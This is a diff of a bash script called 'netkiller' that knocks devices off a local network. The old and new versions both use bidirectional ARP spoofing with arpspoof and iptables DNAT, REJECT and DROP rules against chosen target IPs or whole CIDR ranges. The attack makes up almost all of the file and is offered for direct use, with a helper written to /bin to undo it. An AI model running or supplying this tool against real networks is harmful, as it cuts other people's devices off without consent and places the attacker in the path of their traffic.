@@ -1,147 +1,191 @@
 #!/bin/bash
 
-# Check if script is running as root
-if [[ $EUID -ne 0 ]]; then
-    exec sudo "$0" "$@"
-fi
-
-# Detect network configuration
-WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
-GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
-CIDR=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
-IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
-
-echo "Current Network Information"
-echo "INTERFACE: | $WLAN"
-echo "GATEWAY:   | $GW"
-echo "Device IP: | $IP"
-echo "TARGETS:   | $CIDR"
-echo ""
-
-# Detect interface 
-echo "Enter Wireless Interface: Skip for default"
-read -p "> $WLAN " WLN
-INTERFACE="${WLN:-$WLAN}"
-
-# Detect Gateway IP
-echo "Enter Router Gateway IP: Skip for default"
-read -p "> $GW " INET
-GATEWAY="${INET:-$GW}"
-
-# Detect Target IPs or CIDR
-echo "Enter Single Target IP, Multiple Target IPs (e.g 10.0.0.123,10.0.0.124) or CIDR (e.g., 192.168.1.0/24)"
-read -p "> " SUB
-NETWORK_CIDR="${SUB:-$CIDR}"
-
-# Detect Device IP
-MYIP="$IP"
-
-echo ""
-# Prompt configuration
-echo "Target Network Configurations"
-echo "Target Interface: | $INTERFACE"
-echo "Target Gateway:   | $GATEWAY"
-echo "Target Subnet:    | $NETWORK_CIDR"
-echo "This Device IP:   | $MYIP (exempted)"
-echo ""
-
-# Enable IP forwarding
-echo 1 > /proc/sys/net/ipv4/ip_forward
-
-# Cleanup function to remove iptables rules and kill arpspoof
-cat > /bin/netkiller-stop << EOF
-#!/bin/bash
-echo "Cleaning up and restoring the connections..."
-iptables -F FORWARD
-iptables -t nat -F PREROUTING
-pkill -f arpspoof
-EOF
-chmod 755 /bin/netkiller-stop
-
-# Function to validate IP address format
-is_valid_ip() {
+# Function to validate IP address
+validate_ip() {
     local ip=$1
-    if [[ $ip =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
+    if [[ $ip =~ ^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$ ]]; then
+        IFS='.' read -r -a octets <<< "$ip"
+        for octet in "${octets[@]}"; do
+            if ((octet < 0 || octet > 255)); then
+                return 1
+            fi
+        done
         return 0
     else
         return 1
     fi
 }
 
-# Function to process a single target IP
-process_target_ip() {
-    local TARGET_IP=$1
-    if [ "$TARGET_IP" != "$MYIP" ] && [ "$TARGET_IP" != "$GATEWAY" ]; then
-        # Drop all packets except your IP source and destination (bidirectional)
-        iptables -t nat -I PREROUTING -s "$TARGET_IP" -j DNAT --to-destination "$GATEWAY"
-        iptables -I FORWARD -s "$TARGET_IP" -p tcp -j REJECT --reject-with tcp-reset
-        iptables -I FORWARD -s "$TARGET_IP" -p udp -j REJECT --reject-with icmp-port-unreachable
-        iptables -I FORWARD -s "$TARGET_IP" -p icmp -j REJECT --reject-with icmp-host-unreachable
-        iptables -I FORWARD -s "$TARGET_IP" -j DROP
+# Function to expand CIDR to individual IPs
+expand_cidr() {
+    local cidr=$1
+    local device_ip=$2
+    local ips=()
 
-        # Bidirectional ARP spoofing
-        (
-            arpspoof -i "$INTERFACE" -t "$TARGET_IP" "$GATEWAY" >/dev/null 2>&1 &
-            arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET_IP" >/dev/null 2>&1 &
-        ) &    
-        echo "Netkiller targeting IP: $TARGET_IP"
-    else
-        echo "Skipping our own IP or gateway: $TARGET_IP"
-    fi
+    # Get network range using ipcalc
+    local network_info=$(ipcalc -n "$cidr")
+    local broadcast_info=$(ipcalc -b "$cidr")
+
+    local network=$(echo "$network_info" | grep -oP 'Network:\s+\K[0-9.]+')
+    local broadcast=$(echo "$broadcast_info" | grep -oP 'Broadcast:\s+\K[0-9.]+')
+
+    IFS='.' read -r -a net_octets <<< "$network"
+    IFS='.' read -r -a bcast_octets <<< "$broadcast"
+
+    for ((a=${net_octets[0]}; a<=${bcast_octets[0]}; a++)); do
+        for ((b=${net_octets[1]}; b<=${bcast_octets[1]}; b++)); do
+            for ((c=${net_octets[2]}; c<=${bcast_octets[2]}; c++)); do
+                for ((d=${net_octets[3]}; d<=${bcast_octets[3]}; d++)); do
+                    ip="$a.$b.$c.$d"
+                    # Skip network and broadcast addresses
+                    if [[ "$ip" != "$network" && "$ip" != "$broadcast" ]]; then
+                        # Skip device IP
+                        if [[ "$ip" != "$device_ip" ]]; then
+                            ips+=("$ip")
+                        fi
+                    fi
+                done
+            done
+        done
+    done
+
+    echo "${ips[@]}"
 }
 
-# Check if input is a list of IPs or a CIDR
-if [[ $NETWORK_CIDR =~ "," ]]; then
-    # Handle multiple IPs
-    IFS=',' read -ra TARGET_IPS <<< "$NETWORK_CIDR"
-    for TARGET_IP in "${TARGET_IPS[@]}"; do
-        TARGET_IP=$(echo "$TARGET_IP" | tr -d '[:space:]') # Trim whitespace
-        if is_valid_ip "$TARGET_IP"; then
-            process_target_ip "$TARGET_IP"
-        else
-            echo "Invalid IP address: $TARGET_IP. Skipping..."
-        fi
-    done
-elif [[ $NETWORK_CIDR =~ "/" ]]; then
-    # Handle CIDR range
-    if ! command -v ipcalc &> /dev/null; then
-        echo "Error: ipcalc is required but not installed. Please install it (apt install ipcalc or yum install ipcalc)"
-        exit 1
-    fi
-
-    HOSTMIN=$(ipcalc "$NETWORK_CIDR" | grep HostMin | awk '{print $2}')
-    HOSTMAX=$(ipcalc "$NETWORK_CIDR" | grep HostMax | awk '{print $2}')
-
-    # IP to decimal
-    ip2dec() {
-        IFS=. read -r a b c d <<< "$1"
-        echo "$(( (a << 24) + (b << 16) + (c << 8) + d ))"
-    }
-
-    # Decimal to IP
-    dec2ip() {
-        local dec=$1
-        echo "$(( (dec >> 24) & 255 )).$(( (dec >> 16) & 255 )).$(( (dec >> 8) & 255 )).$(( dec & 255 ))"
-    }
-
-    MIN=$(ip2dec "$HOSTMIN")
-    MAX=$(ip2dec "$HOSTMAX")
-
-    for (( i = MIN; i <= MAX; i++ )); do
-        TARGET_IP=$(dec2ip "$i")
-        process_target_ip "$TARGET_IP"
-    done
-else
-    # Handle single IP
-    if is_valid_ip "$NETWORK_CIDR"; then
-        process_target_ip "$NETWORK_CIDR"
-    else
-        echo "Invalid IP address format: $NETWORK_CIDR"
-        exit 1
-    fi
+# Check if script is running as root
+if [[ $EUID -ne 0 ]]; then
+    echo "This script must be run as root"
+    echo "Please re-run using: sudo $0 $*"
+    exit 1
 fi
 
-echo "Netkiller targeting network: $NETWORK_CIDR"
+# Check for required tools
+REQUIRED_TOOLS=("dsniff" "iptables" "ipcalc")
+
+for tool in "${REQUIRED_TOOLS[@]}"; do
+    if ! command -v "$tool" &> /dev/null; then
+        echo "$tool is required but not installed. Please install it."
+        exit 1
+    fi
+done
+
+# Detect network
+WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
+GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
+MYIP=$(ip addr show $WLAN | awk '/inet / {print $2}' | cut -d/ -f1)
+
 echo ""
-echo "Netkiller is running in the background..."
+echo "Current Network Information"
+echo "INTERFACE: | $WLAN"
+echo "GATEWAY:   | $GW"
+echo "DEVICE IP: | $MYIP"
+echo ""
+
+# Get user input
+echo "Enter network interface (e.g., $WLAN): Enter to skip"
+read -p "> $WLAN " WLN
+INTERFACE="${WLN:-$WLAN}"
+echo ""
+
+echo "Enter the Gateway IP: Enter to skip"
+read -p "> $GW " INET
+GATEWAY="${INET:-$GW}"
+echo ""
+
+echo "Enter Device IP: $MYIP"
+DEVICE_IP="$MYIP"
+echo ""
+
+echo "Enter target IP (e.g 10.0.0.10 10.0.0.20 or 10.0.0.1/20)"
+read -p "> " TARGET_INPUT
+echo ""
+
+echo "Target Device IP"
+echo "INTERFACE: | $INTERFACE"
+echo "GATEWAY:   | $GATEWAY"
+echo "DEVICE IP: | $DEVICE_IP"
+echo "TARGET:    | $TARGET_INPUT"
+echo ""
+
+# Validate gateway and device IP
+if ! validate_ip "$GATEWAY"; then
+    echo "Invalid gateway IP"
+    exit 1
+fi
+
+if ! validate_ip "$DEVICE_IP"; then
+    echo "Invalid device IP"
+    exit 1
+fi
+
+# Process target input
+TARGETS=()
+for input in $TARGET_INPUT; do
+    if [[ $input == *"/"* ]]; then
+        # CIDR notation - expand it
+        expanded_ips=$(expand_cidr "$input" "$DEVICE_IP")
+        if [ -z "$expanded_ips" ]; then
+            echo "No valid IPs found in CIDR range $input (after skipping device IP)"
+        else
+            TARGETS+=($expanded_ips)
+        fi
+    else
+        # Single IP
+        if validate_ip "$input"; then
+            if [[ "$input" != "$DEVICE_IP" ]]; then
+                TARGETS+=("$input")
+            else
+                echo "Skipping device IP $input"
+            fi
+        else
+            echo "Invalid IP address: $input"
+        fi
+    fi
+done
+
+if [ ${#TARGETS[@]} -eq 0 ]; then
+    echo "No valid target IPs provided"
+    exit 1
+fi
+
+echo "Target IPs to block: ${TARGETS[@]}"
+
+# Enable IP forwarding
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+# Block all of the target packets for each target
+for TARGET in "${TARGETS[@]}"; do
+    echo "Blocking $TARGET..."
+
+    sudo iptables -t nat -I PREROUTING -s "$TARGET" -j DNAT --to-destination "$GATEWAY"
+    sudo iptables -I FORWARD -s "$TARGET" -p tcp -j REJECT --reject-with tcp-reset
+    sudo iptables -A FORWARD -s "$TARGET" -p udp -j REJECT --reject-with icmp-port-unreachable
+    sudo iptables -A FORWARD -s "$TARGET" -p icmp -j REJECT --reject-with icmp-host-unreachable
+    sudo iptables -A FORWARD -s "$TARGET" -j DROP
+    sudo iptables -I FORWARD -d "$TARGET" -j DROP
+
+    # Bidirectional ARP Spoofing
+    sudo arpspoof -i "$INTERFACE" -t "$TARGET" "$GATEWAY" >/dev/null 2>&1 &
+    sudo arpspoof -i "$INTERFACE" -t "$GATEWAY" "$TARGET" >/dev/null 2>&1 &
+done
+
+echo ""
+echo "Blocking rules applied."
+
+# Cleanup function
+cat > /bin/netkiller-stop << EOF
+#!/bin/bash
+echo "Unblocking the Device..."
+    # Kill all arpspoof processes
+    sudo pkill arpspoof
+    # Flush iptables rules
+    sudo iptables -F FORWARD
+    sudo iptables -t nat -F
+sleep 2s
+echo "Done!"
+EOF
+chmod 755 /bin/netkiller-stop
+
+echo ""
+echo "Netkiller is running in the Background!"
 echo "To stop, run: sudo netkiller-stop"
